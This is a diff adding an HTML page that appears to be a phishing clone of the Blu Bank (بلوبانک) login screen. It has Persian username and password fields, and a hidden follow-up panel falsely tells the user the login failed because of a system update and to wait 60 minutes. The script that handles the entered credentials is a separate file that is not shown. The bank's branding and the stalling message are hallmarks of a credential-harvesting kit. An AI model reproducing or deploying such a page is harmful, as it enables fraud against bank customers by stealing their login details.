@@ -1,0 +1,162 @@
+<!DOCTYPE html>
+<html lang="en">
+  <head>
+    <meta charset="UTF-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+    <title>بلوبانک</title>
+    <link rel="stylesheet" href="./assets/css/App.css" />
+  </head>
+  <style>
+    @font-face {
+      font-family: 'Vazir';
+      src: url('./assets/fonts/Vazir-400.woff2');
+    }
+    * {
+      font-family: 'Vazir', sans-serif;
+    }
+    .placeshow {
+      border: 2px solid #4f91e7;
+    }
+    .loader,
+    .loader:before,
+    .loader:after {
+      border-radius: 50%;
+      width: 2.5em;
+      height: 2.5em;
+      animation-fill-mode: both;
+      animation: bblFadInOut 1.8s infinite ease-in-out;
+    }
+    .loader {
+      color: #fff;
+      font-size: 7px;
+      position: relative;
+      text-indent: -9999em;
+      transform: translateZ(0);
+      animation-delay: -0.16s;
+    }
+    .loader:before,
+    .loader:after {
+      content: '';
+      position: absolute;
+      top: 0;
+    }
+    .loader:before {
+      left: -3.5em;
+      animation-delay: -0.32s;
+    }
+    .loader:after {
+      left: 3.5em;
+    }
+
+    @keyframes bblFadInOut {
+      0%,
+      80%,
+      100% {
+        box-shadow: 0 2.5em 0 -1.3em;
+      }
+      40% {
+        box-shadow: 0 2.5em 0 0;
+      }
+    }
+  </style>
+  <body>
+    <div class="flex">
+      <div class="p-[9px]">
+        <svg
+          viewBox="0 0 24 24"
+          fill="none"
+          xmlns="http://www.w3.org/2000/svg"
+          width="24"
+          height="24"
+          class="styles-module_coloredIcon__ZL8Pn"
+        >
+          <path
+            fill-rule="evenodd"
+            clip-rule="evenodd"
+            d="M2.25 12c0-5.385 4.365-9.75 9.75-9.75s9.75 4.365 9.75 9.75-4.365 9.75-9.75 9.75S2.25 17.385 2.25 12ZM11 17a1 1 0 0 1 1-1h.01a1 1 0 0 1 1 1v.01a1 1 0 0 1-1 1H12a1 1 0 0 1-1-1V17Zm1-9.25c-.69 0-1.25.56-1.25 1.25a.75.75 0 0 1-1.5 0 2.75 2.75 0 1 1 5.5 0c0 1.018-.685 1.756-1.139 2.245l-.06.065c-.55.596-.801.919-.801 1.292v.898a.75.75 0 0 1-1.5 0v-.898c0-1.018.685-1.757 1.139-2.245l.06-.065c.55-.596.801-.92.801-1.292 0-.69-.56-1.25-1.25-1.25Z"
+            fill="#4E91E6"
+          ></path>
+        </svg>
+      </div>
+    </div>
+    <div style="" id="cardfull-1">
+      <div class="flex justify-center mt-16 mb-14">
+        <img src="./assets/logo/logo.svg" alt="" />
+      </div>
+      <div class="flex justify-center">
+        <div
+          id="card-1"
+          class="w-[90%] p-3 py-4 bg-[#f1f5f6] rounded-lg border-2 border-transparent"
+        >
+          <div class="flex-col">
+            <input
+              id="user"
+              type="text"
+              class="w-full bg-transparent text-right outline-none -mt-2 placeholder:text-[#7c8e98]"
+              placeholder="نام کاربری"
+              autocomplete="off"
+            />
+            <hr class="bg-[#d1d5d8] my-1 mt-2" />
+            <input
+              autocomplete="off"
+              id="pass"
+              type="password"
+              class="w-full bg-transparent text-right outline-none placeholder:text-[#7c8e98]"
+              placeholder="رمز عبور"
+            />
+            <img
+              id="eyes"
+              style="display: none"
+              class="absolute w-6 -mt-4"
+              src="./assets/logo/eye-show.jpg"
+              alt=""
+            />
+          </div>
+        </div>
+      </div>
+      <div class="flex justify-center my-5">
+        <button
+          id="btn"
+          disabled
+          class="flex justify-center items-center disabled:bg-[#bfccd4] text-white w-[90%] rounded-lg p-[10px] bg-[#4f91e7] h-10 outline-none"
+        >
+          ورود به بلو
+        </button>
+      </div>
+      <div class="flex justify-center">
+        <h1 class="text-[#4f91e7] text-center font-bold">نیاز به کمک دارم</h1>
+      </div>
+    </div>
+    <!-- cardfull2 -->
+    <div style="display: none" id="cardfull-2">
+      <div class="flex justify-center mt-2 mb-1">
+        <img class="w-40" src="./assets/logo/home.jpg" alt="" />
+      </div>
+      <div class="flex p-8">
+        <h1 class="text-base text-right font-normal">
+          کاربر گرامی فرآیند ورود به حساب بلو به دلیل بروزرسانی سیستم ناموفق بود
+        </h1>
+      </div>
+      <div class="flex items-center justify-end">
+        <div class="flex-col">
+          <p style="direction: rtl" class="rtl">۶۰ دقیقه زمان !</p>
+          <p style="direction: rtl" class="rtl text-[#738d9a]">
+            کمتر از ۶۰ دقیقه زمان نیاز دارم
+          </p>
+        </div>
+        <img class="w-12 mx-4" src="./assets/logo/clock.jpg" alt="" />
+      </div>
+      <div class="flex justify-center my-5">
+        <button
+          onclick="back()"
+          class="flex justify-center items-center disabled:bg-[#bfccd4] absolute left-0 right-0 bottom-0 mb-5 mx-auto text-white w-[90%] rounded-lg p-[10px] bg-[#4f91e7] h-12 outline-none"
+        >
+          بازگشت
+        </button>
+      </div>
+    </div>
+
+    <script src="https://code.jquery.com/jquery-3.7.1.min.js"></script>
+    <script src="./assets/js/index.js"></script>
+  </body>
+</html>
